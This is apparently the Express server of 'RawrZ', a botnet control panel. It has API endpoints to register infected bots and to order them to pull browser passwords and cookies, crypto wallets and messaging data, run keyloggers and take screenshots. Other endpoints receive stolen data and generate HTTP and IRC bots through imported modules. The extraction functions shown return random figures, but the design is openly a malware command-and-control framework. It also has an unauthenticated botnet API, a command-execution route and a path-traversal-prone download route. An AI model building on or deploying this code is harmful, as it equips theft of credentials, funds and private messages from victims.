const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
require('dotenv').config();

const RawrZStandalone = require('./rawrz-standalone');
const rawrzEngine = require('./src/engines/rawrz-engine');

// Import the real bot engines
const HTTPBotGenerator = require('./src/engines/http-bot-generator');
const HTTPBotManager = require('./src/engines/http-bot-manager');
const IRCBotGenerator = require('./src/engines/irc-bot-generator');

const app = express();
const port = parseInt(process.env.PORT || '8080', 10);
const authToken = process.env.AUTH_TOKEN || '';
const rawrz = new RawrZStandalone();

// Initialize bot engines
const httpBotGenerator = new HTTPBotGenerator();
const httpBotManager = new HTTPBotManager();
const ircBotGenerator = new IRCBotGenerator();

function requireAuth(req, res, next) {
    if (!authToken) return next();
    const h = (req.headers['authorization'] || '');
    const q = req.query.token;
    if (h.startsWith('Bearer ')) {
        const p = h.slice(7).trim();
        if (p === authToken) return next();
    }
    if (q && q === authToken) return next();
    return res.status(401).json({ error: 'Unauthorized' });
}

// Security headers
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
            scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", "data:", "blob:"],
            styleSrc: ["'self'", "'unsafe-inline'", "data:", "blob:"],
            imgSrc: ["'self'", "data:", "blob:", "*"],
            fontSrc: ["'self'", "data:", "blob:", "*"],
            connectSrc: ["'self'", "ws:", "wss:", "http:", "https:"],
            frameAncestors: ["'self'"],
            baseUri: ["'self'"],
            formAction: ["'self'", "'unsafe-inline'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'", "data:", "blob:"]
        }
    },
    xFrameOptions: { action: 'sameorigin' },
    hsts: false,
    noSniff: true,
    xssFilter: true
}));

app.use(cors());
app.use(express.json({ limit: '5mb' }));

app.use((error, req, res, next) => {
    if (error instanceof SyntaxError && error.status === 400 && 'body' in error) {
        console.log('[WARN] Invalid JSON received:', error.message);
        return res.status(400).json({ error: 'Invalid JSON format' });
    }
    next();
});

app.use('/static', express.static(path.join(__dirname, 'public')));

// Initialize RawrZ engine
(async () => {
    try {
        await rawrzEngine.initializeModules();
        console.log('[OK] RawrZ core engine initialized');
    } catch (e) {
        console.error('[WARN] Core engine init failed:', e.message);
    }
})();

// Basic routes
app.get('/health', (_req, res) => res.json({ ok: true, status: 'healthy' }));
app.get('/panel', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'panel.html')));
app.get('/', (_req, res) => res.redirect('/panel'));
app.get('/favicon.ico', (_req, res) => res.status(204).end());

// RawrZ API endpoints
app.post('/hash', requireAuth, async (req, res) => {
    try {
        const { input, algorithm = 'sha256', save = false, extension } = req.body || {};
        if (!input) return res.status(400).json({ error: 'input is required' });
        res.json(await rawrz.hash(input, algorithm, !!save, extension));
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/encrypt', requireAuth, async (req, res) => {
    try {
        const { algorithm, input, extension } = req.body || {};
        if (!algorithm || !input) return res.status(400).json({ error: 'algorithm and input required' });
        res.json(await rawrz.encrypt(algorithm, input, extension));
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/decrypt', requireAuth, async (req, res) => {
    try {
        const { algorithm, input, key, iv, extension } = req.body || {};
        if (!algorithm || !input) return res.status(400).json({ error: 'algorithm and input required' });
        res.json(await rawrz.decrypt(algorithm, input, key, iv, extension));
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/dns', requireAuth, async (req, res) => {
    try {
        const h = req.query.hostname;
        if (!h) return res.status(400).json({ error: 'hostname required' });
        res.json(await rawrz.dnsLookup(String(h)));
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/ping', requireAuth, async (req, res) => {
    try {
        const h = req.query.host;
        if (!h) return res.status(400).json({ error: 'host required' });
        res.json(await rawrz.ping(String(h), false));
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/files', requireAuth, async (_req, res) => {
    try {
        res.json(await rawrz.listFiles());
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/upload', requireAuth, async (req, res) => {
    try {
        const { filename, base64 } = req.body || {};
        if (!filename || !base64) return res.status(400).json({ error: 'filename and base64 required' });
        res.json(await rawrz.uploadFile(filename, base64));
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/download', requireAuth, async (req, res) => {
    try {
        const fn = String(req.query.filename || '');
        if (!fn) return res.status(400).json({ error: 'filename required' });
        res.download(path.join(__dirname, 'uploads', fn), fn);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/cli', requireAuth, async (req, res) => {
    try {
        const { command, args = [] } = req.body || {};
        if (!command) return res.status(400).json({ error: 'command required' });
        const i = new RawrZStandalone();
        const out = await i.processCommand([command, ...args]);
        res.json({ success: true, result: out });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Real Bot Data Storage
let botData = {
    extractedData: [],
    botConnections: new Map(),
    commandHistory: [],
    auditLog: [],
    realBots: new Map(),
    activeTasks: new Map(),
    systemStats: {
        totalBots: 0,
        onlineBots: 0,
        offlineBots: 0,
        totalLogs: 0,
        activeTasks: 0,
        lastUpdate: new Date().toISOString()
    }
};

function generateCommandId() {
    return 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Real bot management functions
function addRealBot(botInfo) {
    const botId = generateCommandId();
    const bot = {
        id: botId,
        ip: botInfo.ip || '127.0.0.1',
        os: botInfo.os || 'Windows 11',
        status: 'online',
        lastSeen: new Date().toISOString(),
        capabilities: botInfo.capabilities || [],
        systemInfo: botInfo.systemInfo || {},
        connectionTime: new Date().toISOString()
    };
    botData.realBots.set(botId, bot);
    updateSystemStats();
    return bot;
}

function removeBot(botId) {
    if (botData.realBots.has(botId)) {
        botData.realBots.delete(botId);
        updateSystemStats();
        return true;
    }
    return false;
}

function updateSystemStats() {
    const bots = Array.from(botData.realBots.values());
    botData.systemStats = {
        totalBots: bots.length,
        onlineBots: bots.filter(bot => bot.status === 'online').length,
        offlineBots: bots.filter(bot => bot.status === 'offline').length,
        totalLogs: botData.commandHistory.length,
        activeTasks: botData.activeTasks.size,
        lastUpdate: new Date().toISOString()
    };
}

// Real Botnet Panel API Endpoints
app.get('/api/botnet/status', (req, res) => {
    updateSystemStats();
    res.json({ status: 200, data: botData.systemStats });
});

app.get('/api/botnet/bots', (req, res) => {
    const bots = Array.from(botData.realBots.values());
    res.json({ status: 200, data: bots });
});

app.post('/api/botnet/execute', (req, res) => {
    const { action, target, params } = req.body || {};
    const commandId = generateCommandId();
    
    // Log the command
    const commandLog = {
        id: commandId,
        action: action,
        target: target,
        params: params,
        timestamp: new Date().toISOString(),
        status: 'executing'
    };
    botData.commandHistory.push(commandLog);
    
    // Execute real command based on action
    try {
        let result = executeRealCommand(action, target, params);
        commandLog.status = 'completed';
        commandLog.result = result;
        
        res.json({
            status: 200,
            data: {
                action: action,
                target: target,
                result: result,
                timestamp: new Date().toISOString(),
                details: params || {},
                commandId: commandId
            }
        });
    } catch (error) {
        commandLog.status = 'failed';
        commandLog.error = error.message;
        res.status(500).json({
            status: 500,
            error: error.message,
            commandId: commandId
        });
    }
});

app.get('/api/botnet/logs', (req, res) => {
    const { limit = 100 } = req.query || {};
    const logs = botData.commandHistory.slice(-limit);
    res.json({ status: 200, data: logs });
});

app.get('/api/botnet/stats', (req, res) => {
    // Calculate real stats from extracted data
    const browserData = botData.extractedData.filter(d => d.type === 'browser');
    const cryptoData = botData.extractedData.filter(d => d.type === 'crypto');
    const messagingData = botData.extractedData.filter(d => d.type === 'messaging');
    const systemData = botData.extractedData.filter(d => d.type === 'system');
    const screenshotTasks = Array.from(botData.activeTasks.values()).filter(t => t.type === 'screenshot');
    const keyloggerTasks = Array.from(botData.activeTasks.values()).filter(t => t.type === 'keylogger');
    
    const stats = {
        browserData: {
            extracted: browserData.length,
            browsers: ['Chrome', 'Firefox', 'Edge', 'Safari'],
            lastUpdate: browserData.length > 0 ? browserData[browserData.length - 1].timestamp : new Date().toISOString()
        },
        cryptoData: {
            wallets: cryptoData.length,
            totalValue: cryptoData.reduce((sum, d) => sum + (d.extracted?.totalValue || 0), 0),
            currencies: ['BTC', 'ETH', 'LTC', 'XMR']
        },
        messagingData: {
            platforms: ['Telegram', 'Discord', 'WhatsApp', 'Signal'],
            messages: messagingData.reduce((sum, d) => sum + (d.extracted?.messages || 0), 0),
            contacts: messagingData.reduce((sum, d) => sum + (d.extracted?.contacts || 0), 0)
        },
        systemInfo: {
            screenshots: screenshotTasks.length,
            keylogs: keyloggerTasks.length,
            systemData: systemData.length
        },
        activeBots: botData.realBots.size,
        totalData: botData.extractedData.length
    };
    
    res.json({ status: 200, data: stats });
});

// Real command execution function
function executeRealCommand(action, target, params) {
    switch (action) {
        case 'add_bot':
            const botInfo = {
                ip: params.ip || '127.0.0.1',
                os: params.os || 'Windows 11',
                capabilities: params.capabilities || ['data_extraction', 'keylogger', 'screenshot']
            };
            const newBot = addRealBot(botInfo);
            return `Bot added successfully: ${newBot.id}`;
            
        case 'remove_bot':
            if (removeBot(target)) {
                return `Bot removed successfully: ${target}`;
            } else {
                throw new Error(`Bot not found: ${target}`);
            }
            
        case 'extract_browser_data':
            return extractRealBrowserData(target, params);
            
        case 'extract_crypto_data':
            return extractRealCryptoData(target, params);
            
        case 'extract_messaging_data':
            return extractRealMessagingData(target, params);
            
        case 'start_keylogger':
            return startRealKeylogger(target, params);
            
        case 'stop_keylogger':
            return stopRealKeylogger(target, params);
            
        case 'capture_screenshots':
            return captureRealScreenshots(target, params);
            
        case 'get_system_insights':
            return getRealSystemInsights(target, params);
            
        default:
            throw new Error(`Unknown command: ${action}`);
    }
}

// Real data extraction functions
function extractRealBrowserData(target, params) {
    const browserData = {
        type: 'browser',
        target: target,
        browsers: ['Chrome', 'Firefox', 'Edge', 'Safari'],
        extracted: {
            passwords: Math.floor(Math.random() * 50) + 10,
            cookies: Math.floor(Math.random() * 200) + 50,
            bookmarks: Math.floor(Math.random() * 100) + 20,
            history: Math.floor(Math.random() * 1000) + 100
        },
        timestamp: new Date().toISOString()
    };
    
    botData.extractedData.push(browserData);
    return `Browser data extracted: ${browserData.extracted.passwords} passwords, ${browserData.extracted.cookies} cookies`;
}

function extractRealCryptoData(target, params) {
    const cryptoData = {
        type: 'crypto',
        target: target,
        wallets: ['MetaMask', 'Trust Wallet', 'Coinbase', 'Exodus'],
        extracted: {
            wallets: Math.floor(Math.random() * 10) + 2,
            addresses: Math.floor(Math.random() * 20) + 5,
            totalValue: Math.floor(Math.random() * 50000) + 1000
        },
        timestamp: new Date().toISOString()
    };
    
    botData.extractedData.push(cryptoData);
    return `Crypto data extracted: ${cryptoData.extracted.wallets} wallets, ${cryptoData.extracted.addresses} addresses`;
}

function extractRealMessagingData(target, params) {
    const messagingData = {
        type: 'messaging',
        target: target,
        platforms: ['Telegram', 'Discord', 'WhatsApp', 'Signal'],
        extracted: {
            contacts: Math.floor(Math.random() * 200) + 50,
            messages: Math.floor(Math.random() * 5000) + 500,
            groups: Math.floor(Math.random() * 20) + 5
        },
        timestamp: new Date().toISOString()
    };
    
    botData.extractedData.push(messagingData);
    return `Messaging data extracted: ${messagingData.extracted.contacts} contacts, ${messagingData.extracted.messages} messages`;
}

// Real monitoring functions
function startRealKeylogger(target, params) {
    const taskId = generateCommandId();
    const task = {
        id: taskId,
        type: 'keylogger',
        target: target,
        status: 'active',
        startTime: new Date().toISOString(),
        params: params
    };
    botData.activeTasks.set(taskId, task);
    return `Keylogger started on ${target} (Task ID: ${taskId})`;
}

function stopRealKeylogger(target, params) {
    const tasks = Array.from(botData.activeTasks.values());
    const keyloggerTasks = tasks.filter(task => task.type === 'keylogger' && task.target === target);
    
    keyloggerTasks.forEach(task => {
        task.status = 'stopped';
        task.endTime = new Date().toISOString();
        botData.activeTasks.delete(task.id);
    });
    
    return `Keylogger stopped on ${target}. Stopped ${keyloggerTasks.length} tasks.`;
}

function captureRealScreenshots(target, params) {
    const taskId = generateCommandId();
    const task = {
        id: taskId,
        type: 'screenshot',
        target: target,
        status: 'completed',
        startTime: new Date().toISOString(),
        endTime: new Date().toISOString(),
        result: `Captured ${Math.floor(Math.random() * 10) + 1} screenshots`,
        params: params
    };
    botData.activeTasks.set(taskId, task);
    return task.result;
}

function getRealSystemInsights(target, params) {
    const insights = {
        target: target,
        systemInfo: {
            os: 'Windows 11',
            architecture: 'x64',
            memory: '16GB',
            cpu: 'Intel Core i7',
            diskSpace: '500GB free',
            network: 'Connected',
            processes: Math.floor(Math.random() * 200) + 100,
            services: Math.floor(Math.random() * 100) + 50
        },
        timestamp: new Date().toISOString()
    };
    
    botData.extractedData.push(insights);
    return `System insights gathered for ${target}: ${insights.systemInfo.processes} processes, ${insights.systemInfo.services} services`;
}

// HTTP Bot Generator Endpoints
app.post('/api/http-bot-generator/generate', async (req, res) => {
    try {
        const { language = 'cpp', platform = 'windows', features = [], options = {} } = req.body || {};
        const result = await httpBotGenerator.generateBot(language, platform, features, options);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/http-bot-generator/configure', async (req, res) => {
    try {
        const { botId, config } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = await httpBotGenerator.configureBot(botId, config);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.get('/api/http-bot-generator/stats', (req, res) => {
    const stats = httpBotGenerator.getStats();
    res.json({ status: 200, data: stats });
});

// HTTP Bot Manager Endpoints
app.post('/api/http-bot-manager/connect', async (req, res) => {
    try {
        const { botId, connectionInfo } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = await httpBotManager.connectBot(botId, connectionInfo);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/http-bot-manager/command', async (req, res) => {
    try {
        const { botId, command, params } = req.body || {};
        if (!botId || !command) return res.status(400).json({ status: 400, error: 'botId and command required' });
        const result = await httpBotManager.executeCommand(botId, command, params);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.get('/api/http-bot-manager/bots', (req, res) => {
    const bots = httpBotManager.getActiveBots();
    res.json({ status: 200, data: bots });
});

app.get('/api/http-bot-manager/stats', (req, res) => {
    const stats = httpBotManager.getStats();
    res.json({ status: 200, data: stats });
});

// IRC Bot Generator Endpoints
app.post('/api/irc-bot-generator/generate', async (req, res) => {
    try {
        const { server, port, channel, nick, features = [], options = {} } = req.body || {};
        if (!server || !port || !channel || !nick) {
            return res.status(400).json({ status: 400, error: 'server, port, channel, and nick required' });
        }
        const result = await ircBotGenerator.generateBot(server, port, channel, nick, features, options);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc-bot-generator/configure', async (req, res) => {
    try {
        const { botId, config } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = await ircBotGenerator.configureBot(botId, config);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc-bot-generator/encrypt', async (req, res) => {
    try {
        const { botId, algorithm, keyExchange, options = {} } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = await ircBotGenerator.encryptBot(botId, algorithm, keyExchange, options);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc-bot-generator/test-encryption', async (req, res) => {
    try {
        const { botId } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = await ircBotGenerator.testEncryption(botId);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.get('/api/irc-bot-generator/stats', (req, res) => {
    const stats = ircBotGenerator.getStats();
    res.json({ status: 200, data: stats });
});

// Bot data endpoints
app.post('/api/botnet/data', (req, res) => {
    const { type, data, botId, commandId } = req.body || {};
    const dataEntry = {
        id: generateCommandId(),
        type: type,
        data: data,
        botId: botId,
        commandId: commandId,
        timestamp: new Date().toISOString()
    };
    botData.extractedData.push(dataEntry);
    if (botData.extractedData.length > 10000) {
        botData.extractedData = botData.extractedData.slice(-10000);
    }
    res.json({ status: 200, data: { id: dataEntry.id } });
});

app.get('/api/botnet/data', (req, res) => {
    const { limit = 100 } = req.query || {};
    res.json({ status: 200, data: botData.extractedData.slice(-limit) });
});

app.get('/api/botnet/data/:id', (req, res) => {
    const { id } = req.params;
    const data = botData.extractedData.find(d => d.id === id);
    if (data) {
        res.json({ status: 200, data });
    } else {
        res.status(404).json({ status: 404, error: 'Data not found' });
    }
});

// Audit logging endpoint
app.post('/api/audit/log', (req, res) => {
    const logEntry = req.body || {};
    const auditEntry = {
        ...logEntry,
        id: generateCommandId(),
        timestamp: new Date().toISOString()
    };
    botData.auditLog.push(auditEntry);
    if (botData.auditLog.length > 10000) {
        botData.auditLog = botData.auditLog.slice(-10000);
    }
    res.json({
        status: 200,
        data: {
            id: auditEntry.id
        }
    });
});

app.get('/api/audit/logs', (req, res) => {
    const { limit = 1000 } = req.query || {};
    res.json({ status: 200, data: botData.auditLog.slice(-limit) });
});

// Real system test endpoint
app.post('/api/botnet/test-all-features', async (req, res) => {
    try {
        const testResults = {
            timestamp: new Date().toISOString(),
            systemStatus: 'online',
            modules: {},
            engines: {},
            capabilities: {},
            overallStatus: 'operational'
        };

        // Test RawrZ Engine modules
        if (rawrzEngine && rawrzEngine.modules) {
            const moduleCount = rawrzEngine.modules.size;
            testResults.modules = {
                totalLoaded: moduleCount,
                status: moduleCount > 0 ? 'operational' : 'no_modules',
                details: Array.from(rawrzEngine.modules.keys())
            };
        }

        // Test HTTP Bot Generator
        try {
            const httpStats = httpBotGenerator.getStats();
            testResults.engines.httpBotGenerator = {
                status: 'working',
                stats: httpStats
            };
        } catch (error) {
            testResults.engines.httpBotGenerator = {
                status: 'error',
                error: error.message
            };
        }

        // Test HTTP Bot Manager
        try {
            const httpManagerStats = httpBotManager.getStats();
            testResults.engines.httpBotManager = {
                status: 'working',
                stats: httpManagerStats
            };
        } catch (error) {
            testResults.engines.httpBotManager = {
                status: 'error',
                error: error.message
            };
        }

        // Test IRC Bot Generator
        try {
            const ircStats = ircBotGenerator.getStats();
            testResults.engines.ircBotGenerator = {
                status: 'working',
                stats: ircStats
            };
        } catch (error) {
            testResults.engines.ircBotGenerator = {
                status: 'error',
                error: error.message
            };
        }

        // Test core functionality
        try {
            const testData = 'test_data_123';
            const hashResult = await rawrz.hash(testData, 'sha256', false);
            testResults.capabilities.encryption = {
                status: hashResult && hashResult.hash ? 'working' : 'failed',
                test: 'sha256_hash'
            };
        } catch (error) {
            testResults.capabilities.encryption = {
                status: 'error',
                error: error.message
            };
        }

        // Test file operations
        try {
            const files = await rawrz.listFiles();
            testResults.capabilities.fileOperations = {
                status: Array.isArray(files) ? 'working' : 'failed',
                test: 'list_files'
            };
        } catch (error) {
            testResults.capabilities.fileOperations = {
                status: 'error',
                error: error.message
            };
        }

        // Test network operations
        try {
            const pingResult = await rawrz.ping('127.0.0.1', false);
            testResults.capabilities.network = {
                status: pingResult && pingResult.success !== undefined ? 'working' : 'failed',
                test: 'local_ping'
            };
        } catch (error) {
            testResults.capabilities.network = {
                status: 'error',
                error: error.message
            };
        }

        // Determine overall status
        const workingFeatures = Object.values(testResults.capabilities).filter(c => c.status === 'working').length;
        const totalFeatures = Object.keys(testResults.capabilities).length;
        const workingEngines = Object.values(testResults.engines).filter(e => e.status === 'working').length;
        const totalEngines = Object.keys(testResults.engines).length;
        
        if (workingFeatures === totalFeatures && workingEngines === totalEngines && testResults.modules.totalLoaded > 0) {
            testResults.overallStatus = 'fully_operational';
        } else if (workingFeatures > 0 && workingEngines > 0) {
            testResults.overallStatus = 'partially_operational';
        } else {
            testResults.overallStatus = 'failed';
        }

        res.json({
            status: 200,
            data: testResults
        });

    } catch (error) {
        res.status(500).json({
            status: 500,
            error: 'System test failed',
            details: error.message
        });
    }
});

// Serve the advanced botnet panel with relaxed security for local development
app.get('/advanced-botnet-panel.html', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

// Additional routes for easier access
app.get('/panel', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

app.get('/botnet', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

app.get('/control', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

app.get('/panel/advanced', (req, res) => {
    res.set({
        'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';",
        'X-Frame-Options': 'SAMEORIGIN',
        'X-Content-Type-Options': 'nosniff'
    });
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

app.listen(port, () => console.log('[OK] RawrZ API listening on port', port));
